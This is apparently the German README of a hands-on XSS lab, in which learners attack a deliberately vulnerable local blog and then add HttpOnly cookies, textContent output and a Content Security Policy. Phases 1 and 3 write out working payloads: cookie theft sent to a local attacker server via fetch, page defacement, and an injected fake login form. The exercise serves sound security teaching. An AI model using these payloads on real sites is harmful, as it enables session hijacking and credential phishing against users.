# Cross-Site Scripting (XSS) verstehen und verhindern

## Lernziele

In dieser Übung lernst du:
- Wie Cross-Site Scripting (XSS) Angriffe funktionieren
- Warum XSS eine ernsthafte Sicherheitslücke ist
- Wie du deine Anwendungen gegen XSS schützt
- Das Prinzip "Defense in Depth" in der Praxis

## Szenario

Du betreibst einen einfachen Blog, in dem Nutzer Kommentare hinterlassen können. Ein Sicherheitsforscher hat dich darauf hingewiesen, dass dein Blog anfällig für XSS-Angriffe ist und dir einen Proof-of-Concept geschickt.

In dieser Übung wirst du:
1. Den Angriff selbst nachvollziehen und verstehen
2. Schrittweise verschiedene Schutzmaßnahmen implementieren
3. Lernen, warum mehrere Sicherheitsebenen wichtig sind

## Voraussetzungen

- Node.js (v18 oder höher)
- npm
- Ein moderner Webbrowser

## Setup

1. Installiere die Abhängigkeiten:
```bash
npm install
```

2. Starte die Anwendung mit zwei Terminals:

**Terminal 1 - Blog-App:**
```bash
npm run blog
```

**Terminal 2 - Angreifer-Server:**
```bash
npm run attacker
```

Die Blog-App läuft auf http://localhost:3000
Der Angreifer-Server läuft auf http://localhost:4000

## Aufgaben

### Phase 1: Den Angriff verstehen

**User Story:** Als Sicherheitsforscher möchte ich verstehen, wie XSS-Angriffe funktionieren, um meine Anwendungen besser schützen zu können.

1. Öffne die Blog-App unter http://localhost:3000
2. Füge einen harmlosen Kommentar ein und beobachte, was passiert
3. Öffne den Angreifer-Server unter http://localhost:4000 in einem neuen Tab
4. Füge nun folgenden XSS-Payload als Kommentar im Blog ein:

```html
<img src=x onerror="fetch('http://localhost:4000/steal?cookie=' + document.cookie)">
```

5. Beobachte, was auf dem Angreifer-Server passiert
6. Öffne die Browser-Konsole und gib `document.cookie` ein - was siehst du?

**Fragen zum Nachdenken:**
- Was wurde an den Angreifer-Server gesendet?
- Warum ist das gefährlich?
- Was könnte ein Angreifer mit diesen Informationen tun?

### Phase 2: Cookie-Diebstahl verhindern

**User Story:** Als Entwickler möchte ich verhindern, dass Session-Cookies über JavaScript ausgelesen werden können.

**Aufgabe:** Setze das `HttpOnly`-Flag für Session-Cookies.

1. Öffne `src/blog-app.js`
2. Finde die Stelle, wo das Session-Cookie gesetzt wird
3. Füge das `httpOnly`-Flag hinzu
4. Starte den Blog-Server neu
5. Lösche alle Kommentare (Button "Alle Kommentare löschen")
6. Füge den XSS-Payload erneut ein
7. Prüfe auf dem Angreifer-Server und in der Browser-Konsole, was jetzt passiert

**Fragen zum Nachdenken:**
- Was hat sich geändert?
- Ist der XSS-Angriff jetzt vollständig verhindert?
- Was kann der Angreifer trotzdem noch tun?

### Phase 3: Andere Angriffsmöglichkeiten erkennen

**User Story:** Als Sicherheitsforscher möchte ich verstehen, dass XSS auch ohne Cookie-Diebstahl gefährlich ist.

Das injizierte Script wird immer noch ausgeführt! Teste folgende alternative Angriffe:

**Angriff 1 - DOM-Manipulation:**
```html
<img src=x onerror="document.body.innerHTML = '<h1>Diese Seite wurde gehackt!</h1>'">
```

**Angriff 2 - Phishing-Formular einschleusen:**
```html
<img src=x onerror="const form = document.createElement('div'); form.innerHTML = '<h2 style=color:red>⚠️ Sitzung abgelaufen! Bitte erneut anmelden:</h2><input type=password placeholder=Passwort><button>Login</button>'; document.querySelector('main').prepend(form);">
```

**Fragen zum Nachdenken:**
- Welche dieser Angriffe funktionieren noch?
- Warum reicht das HttpOnly-Flag allein nicht aus?
- Was ist das eigentliche Problem?

### Phase 4: XSS vollständig verhindern

**User Story:** Als Entwickler möchte ich verhindern, dass überhaupt schädlicher Code auf meiner Seite ausgeführt wird.

**Aufgabe 1 - Sichere Ausgabe von Nutzereingaben:**

1. Öffne `src/public/blog.js`
2. Finde die Funktion, die Kommentare anzeigt
3. Ändere die Art, wie Kommentare eingefügt werden, sodass HTML-Tags nicht interpretiert werden
   - Tipp: Nutze `textContent` statt `innerHTML`
4. Teste, ob der XSS-Angriff jetzt noch funktioniert
5. Teste, ob normale Kommentare weiterhin funktionieren

**Aufgabe 2 - Content Security Policy (CSP):**

1. Öffne `src/blog-app.js`
2. Füge einen CSP-Header hinzu, der nur JavaScript von der eigenen Domain erlaubt
3. Starte den Server neu
4. Versuche erneut, einen XSS-Angriff durchzuführen
5. Öffne die Browser-Konsole - was siehst du?

**Fragen zum Nachdenken:**
- Welche Schutzmaßnahme ist wichtiger: textContent oder CSP?
- Warum sollte man beide verwenden (Defense in Depth)?
- Was passiert, wenn ein Entwickler versehentlich doch innerHTML benutzt?

## Wichtige Erkenntnisse

- **XSS ist gefährlich**, weil schädlicher Code im Kontext deiner Website ausgeführt wird
- **HttpOnly-Cookies** schützen vor Cookie-Diebstahl, aber nicht vor XSS selbst
- **Sichere Ausgabe** (textContent) ist die wichtigste Schutzmaßnahme
- **Content Security Policy** ist ein zusätzliches Sicherheitsnetz
- **Defense in Depth**: Mehrere Sicherheitsebenen sind besser als eine

## Ressourcen

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)